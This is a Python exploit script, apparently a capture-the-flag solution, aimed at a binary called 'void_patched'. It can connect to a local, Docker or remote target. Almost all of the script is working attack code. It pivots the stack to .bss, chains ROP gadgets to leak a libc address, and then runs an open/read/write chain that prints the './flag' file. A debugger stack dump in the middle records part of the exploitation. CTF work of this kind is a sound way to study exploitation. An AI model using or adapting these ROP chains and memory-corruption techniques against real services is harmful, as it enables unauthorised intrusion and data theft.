#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep
from subprocess import check_output

context.log_level = 'debug'
exe = context.binary = ELF('./void_patched', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
b *0x40142D
c
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()
    elif args.DOCKER:
        p = remote('localhost', 9090)
    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

# ==================== EXPLOIT ====================
p = start()

offset = 0x70
bss = exe.bss()+0xef0
read_gadget = 0x401415
mov_edi = 0x401452 # mov edi,  [rbp-0x08] ; leave ; ret ;
add_bl_al = 0x4013c3
add_ptr = 0x40121c
pop_rdx = 0x40138f
pop_rbp = 0x40121d
pop_rsi = 0x4013af # # pop rsi ; nop dword ptr [rax + rax] ; nop dword ptr [rax + rax] ; nop dword ptr [rax + rax] ; nop dword ptr [rax + rax] ; ret
leave_ret = 0x40137e

sl(b'-1')
sleep(.5)
# first pivot to bss, and call scanf there for getting libc address on the bss stack
s(flat({
    offset: [
        bss,
        read_gadget,
    ]
}, filler=b'A'))

sleep(.5)
# call scanf then read
s(flat({
    offset: [
        bss+0x70,
        0x4013D0,
    ]
}, filler=b'B'))

'''
00:0000│  0x404dc8 —▸ 0x15555531e1c2 (__isoc99_scanf+178) ◂— mov rdx, qword ptr [rsp + 0x18]
01:0008│  0x404dd0 ◂— 0x3000000008
02:0010│  0x404dd8 —▸ 0x404eb0 ◂— 0x4242424242424242 ('BBBBBBBB')
03:0018│  0x404de0 —▸ 0x404df0 ◂— 0
04:0020│  0x404de8 ◂— 0x3e1fb177b3969f00
05:0028│  0x404df0 ◂— 0
06:0030│  0x404df8 —▸ 0x404f68 ◂— 0x3133743434343
07:0038│  0x404e00 ◂— 0x100
08:0040│  0x404e08 —▸ 0x1555553d1117 (close+23) ◂— cmp rax, -0x1000 /* 'H=' */
09:0048│  0x404e10 ◂— 0x1999999999999999
'''

if args.GDB:
    if args.DOCKER:
        pid = int(check_output(["pidof", "-s", "./void"]))
        gdb.attach(pid, gdbscript=gdbscript, exe=exe.path)
        pause()
    else:
        gdb.attach(p, gdbscript=gdbscript)
        pause()

sl(b'-1')
sleep(.5)
s(flat({
    offset-0x14: [
        0x31337 - 1
    ],

    offset: [
        0,
        pop_rdx,
        0xffffff,
        exe.plt.read
    ]
}, filler=b'C'))

sleep(.5)
s(flat({
    0x90: [
        pop_rsi, bss,
        pop_rdx, 0x82,
        exe.plt.read,
        add_bl_al, 0x404e08+0x3d,
        add_ptr,

        pop_rsi, 0x404e10,
        pop_rdx, 0xffffff,
        exe.plt.read,

        pop_rbp, 0x405028,
        mov_edi, 0x0, 0x0,
        pop_rsi, bss,
        pop_rdx, 0x8,
        exe.plt.read,

        pop_rbp, 0x405078,
        mov_edi, 0x1, 0x0,
        pop_rsi, 0x404dc8,
        pop_rbp, 0x404e08-8,
        leave_ret,
        b'./flag\x00'
    ]
}, filler=b'D'))

sleep(.5)
s(b'A'*0x82)

sleep(.5)
# after write syscall return to this
s(flat(
        pop_rbp, 0x404e30,
        mov_edi, 0x0, 0x0,
        pop_rsi, bss,
        pop_rdx, 0xffffffff,
        exe.plt.read,
        pop_rbp, bss-0x8,
        leave_ret,
))

sleep(.5)
s(b'A')

libc_leak = u64(rb(8))
libc.address = libc_leak - 0x621c2

info('libc leak @ %#x', libc_leak)
slog('libc base @ %#x', libc.address)

rop = ROP(libc)
pop_rax = rop.find_gadget(["pop rax", "ret"])[0]
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
pop_rdx = libc.address + 0x174f96 # pop rdx ; pop rbx ; ret ;
pop_rsi = libc.address + 0x33a03 # pop rsi ; pop r15 ; ret ;

sleep(.5)
# bss
s(flat(
    pop_rdi, 0,
    pop_rsi, 0x404e10, 0,
    pop_rdx, 0xffffff, 0,
    exe.plt.read,
    pop_rbp, 0x404e58-8,
    leave_ret,
))

sleep(.5)
# 0x404e10
s(flat(
    pop_rdi, 0,
    pop_rsi, 0x404e58, 0,
    pop_rdx, 0xffffff, 0,
    exe.plt.read,

    # 0x404e58
    pop_rdi, 0x4050aa,
    pop_rsi, 0, 0,
    pop_rdx, 0, 0,
    pop_rax, 0x2,
    pop_rbp, 0x404e08-8,
    leave_ret,
))

sleep(.5)
s(flat(
    pop_rdi, 6,
    pop_rsi, bss, 0,
    pop_rdx, 0x100, 0,
    pop_rax, 0x0,
    pop_rbp, 0x404e08-8,
    leave_ret,
))

sleep(.5)
s(flat(
    pop_rdi, 1,
    pop_rsi, bss, 0,
    pop_rdx, 0x100, 0,
    pop_rax, 0x1,
    pop_rbp, 0x404e08-8,
    leave_ret,
))

interactive(flag=False)
